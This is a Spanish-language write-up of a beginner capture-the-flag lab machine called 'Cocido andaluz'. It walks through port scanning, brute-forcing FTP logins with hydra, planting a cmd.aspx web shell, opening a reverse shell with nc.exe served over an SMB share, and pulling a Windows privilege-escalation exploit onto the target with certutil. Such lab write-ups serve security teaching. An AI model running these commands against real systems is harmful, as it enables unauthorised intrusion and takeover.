---
description: '🔍 Dificultad: Principiante'
---

# Cocido andaluz

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.85
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (22).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.85 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (23).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 21** perteneciente al **servicio FTP,** el **puerto 80** perteneciente al **servicio HTTP,** el **puerto  135** perteneciente al servicio **MSRPC**, el **puerto 139** perteneciente **netbios-ssn** y el **puerto 445** perteneciente **microsoft-ds** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p21,80,135,139,445 -v 192.168.1.85
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (12).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Ingresamos la IP y nos encontramos la página de por defecto de **Apache**.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)   (9).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://192.168.1.85/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

No encontramos nada relevante.

Revisamos que tenemos el **servicio FTP** pero no tenemos acceso de **anonymous** porque sino se nos había mostrado en los escaneos anteriores.

```bash
hydra ftp://192.168.1.85 -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords.txt
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)   (1).png" alt=""><figcaption></figcaption></figure>

Nos conectamos con esas credenciales al **FTP**.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (6).png" alt=""><figcaption></figcaption></figure>

Son los archivos de la página web.

Por lo que hacemos colocar un **.aspx** para ejecutar comandos de manera remota.

```bash
locate .aspx
cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/cmd.aspx .
```

Nos lo traemos de manera remota.

```bash
put cmd.aspx
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Podemos ejecutar comandos de manera remota por lo que nos mandamos una Reverse Shell.

Nos copiamos esto en nuestro directorio de trabajo.

```bash
locate nc.exe
cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe .
```

Para obtener acceso al sistema, configuraremos un recurso compartido utilizando **impacket-smbserver**. A través de este recurso, transferiremos el binario de **nc.exe** en su versión de 32 bits, ya que la arquitectura de la máquina objetivo corresponde a 32 bits. Esto lo hemos verificado previamente utilizando herramientas como **netexec** o **crackmapexec**.

Ejecutamos.

```bash
impacket-smbserver smbCarpeta . -smb2support
```

En el `cmd.aspx` ejecutamos.

```bash
\\192.168.1.50\cmdCarpetanc.exe -e cmd 192.168.1.50 443
```

Nos ponemos en escucha y le damos a ejecutar.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que usuarios hay.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root.**

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Para ver información del sistema.

```bash
systeminfo
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Buscamos si tiene un exploit de esa versión de Windows. Encontramos [https://www.exploit-db.com/exploits/40564](https://www.exploit-db.com/exploits/40564)

Buscamos en github y encontramos este ejecutable, por lo que nos lo descargamos.

Usamos certutil para pasar ese archivo a la máquina víctima. Para ello iniciamos en nuestra máquina atacante.

```bash
python3 -m http.server 8000
```

En la máquina víctima en el direcotrio `/tmp`.

```bash
certutil.exe -f -urlcache -split http://192.168.1.50/ms11-046.exe
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ejecutamos.

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**. Podemos acceder al usuario **Administrador**.

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
